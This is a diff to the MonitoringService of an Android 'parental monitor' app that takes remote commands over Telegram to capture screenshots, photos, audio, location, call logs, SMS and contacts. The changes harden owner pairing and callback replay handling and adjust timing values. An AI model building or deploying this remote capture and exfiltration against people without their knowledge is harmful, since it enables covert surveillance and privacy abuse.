@@ -136,7 +136,7 @@ class MonitoringService : Service() {
         private val SENSITIVE_COMMANDS = setOf("/screenshot", "/photo", "/location", "/lastcalls", "/lastsms", "/lastnotif", "/contacts", "/history", "/apps", "/log", "/version", "/status", "/battery", "/uptime", "/storage")
         private const val COMMAND_MAX_AGE_SEC = 900L
         private const val MUTATING_MAX_AGE_SEC = 300L
-        private const val PING_RATE_WINDOW_MS = 30_000L
+        private const val PING_RATE_WINDOW_MS = 120_000L
         private const val PING_RESTART_COOLDOWN_MS = 300_000L
         private const val NOTIFICATION_ID = 1
         private const val MAX_AUDIO_KEPT = 5
@@ -606,6 +606,7 @@ class MonitoringService : Service() {
     private fun rememberOwner(id: Long): Boolean {
         if (id == 0L) return false
         if (id == cachedOwnerId) return false
+        if (cachedOwnerId != 0L) return false
         val previousOwner = cachedOwnerId
         cachedOwnerId = id
         try {
@@ -928,10 +929,14 @@ class MonitoringService : Service() {
                     if (cachedOwnerId == 0L && senderId.isNotEmpty() && msgChatId == senderId && senderId != chatId && startHead == "/start" && startArg != chatId) {
                         sendPairHint(senderId)
                     } else if (senderId.isNotEmpty() && msgChatId == senderId && senderId != chatId && startHead == "/start" && startArg == chatId) {
-                        val learned = rememberOwner(senderId.toLongOrNull() ?: 0L)
-                        if (learned) {
-                            registerBotCommands()
-                            sendToTelegram("Owner linked via /start.")
+                        if (cachedOwnerId == 0L) {
+                            val learned = rememberOwner(senderId.toLongOrNull() ?: 0L)
+                            if (learned) {
+                                registerBotCommands()
+                                sendToTelegram("Owner linked via /start.")
+                            }
+                        } else if (senderId != cachedOwnerId.toString()) {
+                            sendToTelegram("\u26A0\uFE0F Pairing attempt ignored: owner already linked.")
                         }
                     }
                     val ownerOk = isOwner(senderId)
@@ -972,8 +977,9 @@ class MonitoringService : Service() {
 
     private suspend fun handleCallbackQuery(query: com.redeye.parentalmonitor.network.TelegramCallbackQuery) {
         val sender = query.from?.id?.toString() ?: return
+        val replayKey = sender + "|" + (query.data.orEmpty()) + "|" + (query.message?.messageId?.toString().orEmpty()) + "|" + (query.message?.date?.toString().orEmpty())
         val dupCallback = synchronized(handledCallbackIds) {
-            val seen = !handledCallbackIds.add(query.id)
+            val seen = !handledCallbackIds.add(replayKey)
             while (handledCallbackIds.size > 200) {
                 try {
                     val it = handledCallbackIds.iterator()
@@ -2253,7 +2259,7 @@ class MonitoringService : Service() {
 
     private suspend fun sendSmsPending(number: String, smsText: String) {
         val sentAction = "com.redeye.parentalmonitor.SMS_SENT_" + System.nanoTime() + "_" + java.util.UUID.randomUUID().toString()
-        val baseCode = smsReqSeq.addAndGet(10000) + (java.util.UUID.randomUUID().hashCode() and 0xfff)
+        val baseCode = smsReqSeq.addAndGet(1000000) + (java.util.UUID.randomUUID().hashCode() and 0xfff)
         val delivered = CompletableDeferred<Boolean>()
         val smsManager = try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
@@ -2266,7 +2272,7 @@ class MonitoringService : Service() {
             return
         }
         val parts: java.util.ArrayList<String> = try {
-            if (smsText.length > 160) smsManager.divideMessage(smsText) else java.util.ArrayList(listOf(smsText))
+            smsManager.divideMessage(smsText).ifEmpty { java.util.ArrayList(listOf(smsText)) }
         } catch (e: Exception) {
             sendToTelegram("\u26A0\uFE0F SMS failed.")
             return
@@ -3154,7 +3160,7 @@ class MonitoringService : Service() {
             reader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
             display = projection.createVirtualDisplay("redeye-shot", width, height, metrics.densityDpi, DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, reader.surface, null, null)
             var image: android.media.Image? = null
-            for (i in 0 until 30) {
+            for (i in 0 until 12) {
                 try { image = reader.acquireLatestImage() } catch (_: Exception) { }
                 if (image != null) break
                 try { Thread.sleep(100) } catch (_: Exception) { }
@@ -3531,7 +3537,7 @@ class MonitoringService : Service() {
             return
         }
         ensureForegroundTypes()
-        val audioFile = File(cacheDir, "audio_" + System.currentTimeMillis() + ".m4a")
+        val audioFile = File(cacheDir, "audio_" + System.currentTimeMillis() + "_" + java.util.UUID.randomUUID() + ".m4a")
         var recorder: android.media.MediaRecorder? = null
         var keepForRetry = false
         var audioOutcome: MediaSendOutcome? = null
